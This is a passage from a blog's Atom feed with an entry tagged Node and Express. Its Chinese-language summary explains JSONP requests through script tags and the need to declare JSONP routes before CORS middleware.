class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></script></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;概念：&lt;/p&gt;
&lt;p&gt;浏览器通过&lt;script&gt;标签的src属性，请求服务器上的数据，同时服务器返回一个函数的调用，这种请求数据的方式·叫做JSONP&lt;/p&gt;
&lt;p&gt;如果项目中已经配置了CORS跨域资源共享，为防止冲突,必须在配置CORS中间件之前声明JSONP的接口，否则</summary>
      
    
    
    
    <category term="Node" scheme="https://coloey.github.io/categories/Node/"/>
    
    <category term="Express" scheme="https://coloey.github.io/categories/Node/Express/"/>
    
    
  </entry>
  
</feed>
